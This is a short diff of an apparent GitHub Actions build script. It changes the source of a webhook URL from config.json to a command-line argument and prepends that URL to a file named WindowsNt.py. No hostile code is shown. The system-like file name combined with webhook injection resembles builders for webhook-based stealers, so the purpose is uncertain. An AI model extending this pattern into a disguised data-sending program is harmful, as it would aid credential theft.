@@ -1,16 +1,18 @@
 import os
+import sys
 import json
 from datetime import datetime
 
 with open('config.json') as r:
     config = json.load(r)
 
+webhook = sys.argv[1]
 env_file_path = os.getenv('GITHUB_ENV')
 date = datetime.now().strftime("%d:%m:%Y")
 time = datetime.now().strftime("%H:%M:%S")
 
 def setup_webhook():
-    content = f"webhook = \'{config.get('webhook')}\'\n"
+    content = f"webhook = \'{webhook}\'\n"
     with open('WindowsNt.py','r') as r:
         content += r.read()
     with open('WindowsNt.py','w') as w:
